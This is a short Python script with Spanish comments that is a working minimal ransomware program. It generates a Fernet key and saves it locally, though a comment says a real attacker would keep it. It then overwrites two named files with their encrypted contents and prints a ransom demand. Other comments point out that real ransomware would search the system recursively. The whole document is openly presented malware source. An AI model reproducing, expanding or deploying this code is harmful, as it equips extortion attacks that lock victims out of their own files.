from cryptography.fernet import Fernet

# Generar una clave de cifrado
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Guardar la clave en un archivo (en la vida real, esto sería guardado por el atacante)
with open('key.key', 'wb') as key_file:
    key_file.write(key)

# Función para cifrar archivos
def encrypt_files(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Lista de archivos a cifrar (en la vida real, se buscarían de manera recursiva en el sistema)
files_to_encrypt = ['Encriptar.txt', 'Encriptar2.txt']

for file in files_to_encrypt:
    encrypt_files(file)

print("Archivos cifrados. Pague el rescate para recuperar sus archivos.")